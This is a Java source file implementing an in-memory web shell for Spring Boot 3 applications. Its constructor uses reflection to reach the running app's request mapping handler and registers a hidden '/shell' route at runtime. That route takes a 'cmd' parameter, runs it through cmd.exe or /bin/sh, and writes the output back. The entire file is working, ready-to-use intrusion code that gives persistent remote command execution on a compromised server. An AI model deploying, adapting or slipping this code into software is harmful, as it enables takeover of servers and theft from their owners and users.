package com.just.exp;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
public class SpringBoot3Memshell {
    public SpringBoot3Memshell() {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Field configField = null;
        try {
            configField = mappingHandlerMapping.getClass().getDeclaredField("config");
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        }
        configField.setAccessible(true);
        RequestMappingInfo.BuilderConfiguration config = null;
        try {
            config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
        Method method2 = null;
        try {
            method2 = SpringBoot3Memshell.class.getMethod("evilFunc", HttpServletRequest.class, HttpServletResponse.class);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        }
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 选择自己要注入的path
        RequestMappingInfo info = RequestMappingInfo.paths("/shell")
                .options(config)
                .build();
        SpringBoot3Memshell evilController = new SpringBoot3Memshell("XXX");
        mappingHandlerMapping.registerMapping(info, evilController, method2);
    }

    public SpringBoot3Memshell(String aaa){}

    public void evilFunc(HttpServletRequest request, HttpServletResponse response) throws Exception {
        java.io.PrintWriter printWriter = response.getWriter();
        printWriter.write("memshell inject success");
        // 获取cmd参数并执行命令
        String command = request.getParameter("cmd");
        if (command != null) {
            try {
                String o = "";
                ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", command});
                } else {
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", command});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();
                printWriter.write(o);
                printWriter.flush();
                printWriter.close();
            } catch (Exception ignored) {

            }
        }
    }
}